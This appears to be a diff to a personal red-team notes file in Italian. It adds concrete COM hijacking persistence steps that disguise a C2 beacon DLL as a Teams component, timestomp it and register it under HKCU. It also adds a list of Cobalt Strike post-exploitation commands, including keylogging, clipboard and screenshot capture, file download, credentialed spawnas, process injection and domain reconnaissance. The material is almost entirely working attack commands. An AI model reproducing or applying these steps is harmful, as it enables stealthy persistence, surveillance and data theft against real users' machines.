@@ -135,14 +135,89 @@ Get-Item -Path "HKLM:\Software\Classes\CLSID\{GUID}\InprocServer32"
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{GUID}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{GUID}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
 New-ItemProperty -Path "HKCU:...\InprocServer32" -Name "ThreadingModel" -Value "Both"
+#Esempio:
+#
+#New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"
+#New-Item -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
+#New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+#
+
+#Sulla macchina vittima:
+#cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
+#upload C:\Payloads\http_x64.dll
+#mv http_x64.dll Microsoft.Teams.HttpClient.dll
+#timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
+#Aggiunti i registri:
+#reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
+#reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
+
+#quando la vittima aprirà teams arriva il becon
+
 
 #Attivazione hijack
-Dopo il logout/login, DllHost.exe tenterà di caricare il COM.
-Poiché ora la versione in HKCU ha la precedenza, verrà caricata la DLL malevola, eseguendo così il codice scelto dall'attaccante (es. un C2 beacon).
+#Dopo il logout/login, DllHost.exe tenterà di caricare il COM.
+#Poiché ora la versione in HKCU ha la precedenza, verrà caricata la DLL malevola, eseguendo così il codice scelto dall'attaccante (es. un C2 beacon).
+
+
+
+
+
 ```
+## Post-Exploitation
+
+```bash
+#comandi utili Cobalt tutti lanciabili dal beacon
+
+#spawn
+spawn x64 http
+#spawnas
+spawnas CONTOSO\rsteel Passw0rd! tcp-local
+#download
+download C:\Users\test\Desktop\desktop.ini
+#process
+ps
+#keylogger
+keylogger
+#jobs
+jobs
+jobs kills
+#clipboard
+clipboard
+#registry
+#read local policy
+reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+#read specific key
+reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
+#Screenshot
+printscreen
+#
+screenshot
+#
+screenwatch
+#VNC
+desktop high/low
+#shell
+shell whoami /user
+#run
+run whoami /user
+#powershell
+powershell $env:computername
+#powerpick
+powerpick $env:computername
+#psInjection
+psinject 3020 x64 $PID
+#Import PowerShell Script
+powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+#
+powerpick Get-Domain
+#.NET
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus
 
 
 
+
+
+```
 
 
 ## Privilege Escalation
